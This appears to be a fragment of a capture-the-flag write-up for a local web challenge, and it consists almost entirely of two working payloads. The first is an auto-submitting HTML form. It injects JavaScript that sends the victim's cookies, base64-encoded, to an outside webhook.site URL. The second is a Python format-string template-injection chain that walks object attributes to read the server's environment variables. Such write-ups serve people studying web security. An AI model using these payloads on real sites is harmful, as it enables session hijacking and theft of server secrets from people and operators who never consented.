```
<form method='POST' action='http://127.0.0.1:5000/your-name#behindthename-redirect'>
    <input name=name value='\".substring(0,0)+`#`;x=`//webhook.site/df233a61-4a57-4ce8-9f2b-99f60f8cdd94/?x=`;fetch(x+btoa(document.cookie))//' />
    <input type=submit />
</form>
<script>window.onload = function() { document.forms[0].submit() }</script>
```

Format string SSTI. We had to use property access only because we cant do function call in format string:
```
{0.__globals__[app].__class__.__bases__[0].__dict__[__init__].__globals__[sys].modules[os].environ}
```
